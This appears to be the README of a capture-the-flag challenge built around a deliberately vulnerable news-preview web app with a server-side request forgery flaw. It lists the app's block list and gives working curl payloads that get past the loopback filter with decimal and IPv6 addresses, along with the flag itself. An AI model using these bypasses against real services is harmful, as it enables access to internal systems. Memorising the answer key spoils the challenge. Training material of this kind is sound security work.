# NewsPreview Platform - SSRF CTF Challenge

## 📋 Challenge Summary

**Difficulty**: Medium-Hard  
**Category**: Web Security / SSRF  
**Flag**: `ACNCTF{ssrf_balanced_challenge}`  
**Estimated Time**: 30-60 minutes  

## 🎯 Challenge Overview

This CTF challenge simulates a realistic SSRF vulnerability in a news preview platform. Players must:

1. **Discover** the hidden `/preview` endpoint through reconnaissance
2. **Understand** the WAF filtering mechanisms 
3. **Bypass** IP-based restrictions using encoding techniques
4. **Exploit** SSRF to access internal services
5. **Retrieve** the flag from the internal admin panel

## 🚀 Quick Start

### Option 1: Docker (Recommended for CTF deployment)
```bash
docker compose up --build -d
# Access: http://localhost:3000
```

### Option 2: Local Development
```bash
npm install
./test-local.sh
# Access: http://localhost:3000
```

## 🛡️ Security Features

### WAF Protection
- Blocks `localhost`, `127.0.0.1`, `file://`
- Prevents access to link-local addresses (`169.254.`)
- Only allows HTTP/HTTPS protocols
- Basic regex-based IP filtering

### Bypass Techniques Required
- **Decimal IP encoding**: `2130706433` instead of `127.0.0.1`
- **IPv6 loopback**: `[::1]` instead of `127.0.0.1`
- **Alternative representations**: Hex, octal, etc.

## 🔍 Solution Path

1. **Reconnaissance**
   ```bash
   curl http://localhost:3000/robots.txt
   # View page source for HTML comments
   ```

2. **Discovery**
   ```bash
   # Try the preview functionality
   curl "http://localhost:3000/preview?link=https://example.com"
   ```

3. **Initial SSRF Test** (Blocked)
   ```bash
   curl "http://localhost:3000/preview?link=http://127.0.0.1:5001/admin/flag"
   # Returns: "Access denied: loopback protection."
   ```

4. **WAF Bypass** (Success)
   ```bash
   # Method 1: Decimal IP
   curl "http://localhost:3000/preview?link=http://2130706433:5001/admin/flag"
   
   # Method 2: IPv6
   curl "http://localhost:3000/preview?link=http://[::1]:5001/admin/flag"
   ```

## 📁 File Structure

```
web2/
├── app.js                 # Main vulnerable application
├── internal-service.js    # Internal service with flag
├── package.json          # Node.js dependencies
├── public/
│   └── index.html        # Frontend with hints
├── docker-compose.yml    # Container orchestration
├── Dockerfile.main       # Main app container
├── Dockerfile.internal   # Internal service container
├── test-local.sh         # Local testing script
├── test-solution.sh      # Solution verification
└── README.md            # Detailed documentation
```

## 🧪 Testing & Validation

### Automated Testing
```bash
./test-solution.sh  # Verify all attack vectors
./test-local.sh     # Full local testing with services
```

### Manual Testing
```bash
# Test legitimate functionality
curl "http://localhost:3000/preview?link=https://httpbin.org/html"

# Test WAF blocking
curl "http://localhost:3000/preview?link=http://localhost:5001/admin"

# Test successful bypass
curl "http://localhost:3000/preview?link=http://2130706433:5001/admin/flag"
```

## 🎓 Learning Objectives

- **SSRF Fundamentals**: Understanding server-side request forgery
- **WAF Evasion**: IP encoding and representation techniques  
- **Reconnaissance**: Finding hidden endpoints and services
- **Network Security**: Internal vs external service access
- **Practical Exploitation**: Real-world SSRF scenarios

## 🔧 Customization Options

### Difficulty Adjustments
- **Easier**: Add more obvious hints, reduce WAF complexity
- **Harder**: Add additional WAF rules, require multi-step exploitation

### Flag Customization
Edit `internal-service.js` line with the flag:
```javascript
flag: "ACNCTF{your_custom_flag_here}"
```

### Port Configuration
- Main app: Change `PORT` in `app.js` (default: 3000)
- Internal service: Change `PORT` in `internal-service.js` (default: 5001)

## 🚨 Security Notes

### Deployment Considerations
- Ensure internal service is properly isolated
- Consider network segmentation in production
- Monitor for actual SSRF attempts in logs

### Educational Use Only
This challenge is designed for:
- Authorized penetration testing training
- CTF competitions and educational events  
- Security awareness demonstrations
- Controlled laboratory environments

## 📊 Expected Player Experience

### Beginner Players (45-90 min)
- May need hints to find the preview endpoint
- Require guidance on WAF bypass techniques
- Learn about IP encoding through trial and error

### Intermediate Players (20-45 min)  
- Quickly identify SSRF opportunity
- Understand WAF restrictions from error messages
- Apply known bypass techniques efficiently

### Advanced Players (10-30 min)
- Rapid reconnaissance and exploitation
- May discover multiple bypass methods
- Could identify additional attack vectors

## 🎯 Success Metrics

- **Discovery Rate**: Players finding the `/preview` endpoint
- **Bypass Success**: Players circumventing WAF restrictions  
- **Flag Retrieval**: Successfully obtaining the final flag
- **Technique Diversity**: Different bypass methods used

---

**Challenge Created By**: CTF Team  
**Last Updated**: September 2024  
**Version**: 1.0
